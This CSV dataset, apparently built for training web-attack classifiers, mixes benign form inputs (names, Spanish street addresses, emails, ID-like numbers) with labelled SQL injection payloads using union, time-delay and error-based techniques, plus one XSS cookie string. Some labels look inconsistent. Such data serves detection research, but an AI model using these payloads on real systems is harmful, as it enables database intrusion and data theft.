Text,attack_type,Label,type
1%');select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
yarela,norm,0,normal
"1');call regexp_substring(repeat(right(char(3702),0),500000000),null) and ('ahjo'='ahjo",sqli,1,sql
raush.runyon@discoteatre.fk,norm,0,normal
1'+(select 'ymgm' where 8204=8204 and sleep(5)#,sqli,1,sql
ve4t4nal,norm,0,normal
"-7043"") where 9755=9755 union all select 9755,9755,9755,9755,9755,9755#",sqli,1,sql
"pl. santa cruz, 199",norm,0,normal
"1')) as vuzt where 4971=4971;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
3128013884204713,norm,0,normal
aforzarse,norm,0,normal
-1scriptdocument.cookie=true;/script,xss,2,sql
mcilwraith_sopaporn@barebackspain.info,norm,0,normal
"1%""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""",sqli,1,sql
1')) or (select * from (select(sleep(5)))ydpu) and (('yqbo'='yqbo,sqli,1,sql
30218134k,norm,0,normal
c/ feria 85,norm,0,normal
"camino ancho s/n,",norm,0,normal
maduric@biosoftware.th,norm,0,normal
"1"") where 2016=2016 and (1547=2093)*2093--",sqli,1,sql
palacios de la fe,norm,0,normal
d.antoni,norm,0,normal
-9522) as lraw where 9472=9472 or (4087=8213)*8213--,sqli,1,sql
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('skdm'='skdm",sqli,1,sql
rull,norm,0,normal
"1"")) as bovm where 5560=5560 union all select null,null,null,null,null,null,null#",sqli,1,sql
pasaje america 189 4?a,norm,0,normal
apulga*rar,norm,0,normal
1wwis,sqli,1,normal
ch56al2it0ra,norm,0,normal
fandio berzal,norm,0,normal
analfabetismo,norm,0,normal
mertin lombana,norm,0,normal
"-5644""))) or make_set(9354=9354,7185) and (((""evcf""=""evcf",sqli,1,normal
avda. fernando ferrerio s/n,norm,0,normal
"pobla de segur 125,",norm,0,normal
"1%""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",sqli,1,normal
7360017663684858,norm,0,normal
whorf.laporte@sindualidad.fo,norm,0,normal
"1,(begin if (8340=8340) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;)",sqli,1,sql
laruffa,norm,0,normal
scissons3,norm,0,normal
"1)) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((7200=7200",sqli,1,sql
calle el milagrena s/n 10a,norm,0,normal
"1) as pcnd where 4589=4589 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
1'||(select 'mnvk' from dual where 4181=4181;select (case when (3676=8635) then 3676 else 1/(select 0) end)--,sqli,1,sql
vetrie,norm,0,normal
schumann@mmo.com.bs,norm,0,normal
10373,norm,0,normal
1') and sleep(5),sqli,1,normal
eansor,norm,0,normal
1'+(select rhlb where 9477=9477;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
5honde,norm,0,normal
24299684t,norm,0,normal
"1"") where 6859=6859 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
"1'))) union all select null,null,null,null,null,null,null--",sqli,1,sql
"1'||(select 'xasp' from dual where 4025=4025 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",sqli,1,sql
froud,norm,0,normal
anuar,norm,0,normal
"1'+(select 'myrb' where 3622=3622 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",sqli,1,sql
"1'+(select acax where 4169=4169 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",sqli,1,sql
65781436x,norm,0,normal
sant jaume dels domenys,norm,0,normal
"-9721' or elt(9511=9238,9238)",sqli,1,normal
87167407y,norm,0,normal
32159249m,norm,0,normal
r0326451anis81,norm,0,normal
que3h5a,norm,0,normal
aguazo,norm,0,normal
"-1617%"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",sqli,1,sql
"1"")) or 4240=(select 4240 from pg_sleep(5))--",sqli,1,sql
1'+(select sijr where 7250=7250;if(1665=3845) select 1665 else drop function nzod--,sqli,1,sql
gu9s8na,norm,0,normal
